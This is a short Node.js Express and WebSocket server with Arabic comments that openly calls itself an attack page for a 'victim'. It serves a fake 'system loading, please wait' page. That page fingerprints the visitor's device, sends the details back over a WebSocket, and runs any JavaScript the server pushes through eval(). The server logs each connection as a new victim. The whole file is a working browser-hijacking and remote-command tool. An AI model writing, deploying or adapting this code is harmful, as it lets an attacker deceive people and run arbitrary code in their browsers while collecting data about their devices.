const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const path = require('path');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// إرسال صفحة الهجوم للضحية مباشرة عند فتح الرابط
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="ar" dir="rtl">
        <head>
            <meta charset="UTF-8">
            <title>جار التحميل...</title>
        </head>
        <body>
            <h2>جاري تهيئة النظام، يرجى الانتظار...</h2>
            <script>
                const host = "wss://" + window.location.host;
                const ws = new WebSocket(host);

                ws.onopen = function() {
                    const deviceInfo = {
                        platform: navigator.platform,
                        userAgent: navigator.userAgent,
                        language: navigator.language,
                        screen: window.innerWidth + "x" + window.innerHeight
                    };
                    ws.send(JSON.stringify(deviceInfo));
                };

                ws.onmessage = function(event) {
                    try {
                        let resCmd = eval(event.data);
                        ws.send(JSON.stringify({ result: resCmd }));
                    } catch (err) {
                        ws.send(JSON.stringify({ error: err.toString() }));
                    }
                };
            </script>
        </body>
        </html>
    `);
});

wss.on('connection', (ws) => {
    console.log('[-] ضحية جديدة دخلت وركبت الاتصال بنجاح!');
    
    ws.on('message', (message) => {
        console.log(`[البيانات المستلمة]: ${message}`);
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`السيرفر شغال بقوة على البورت ${PORT}`);
});
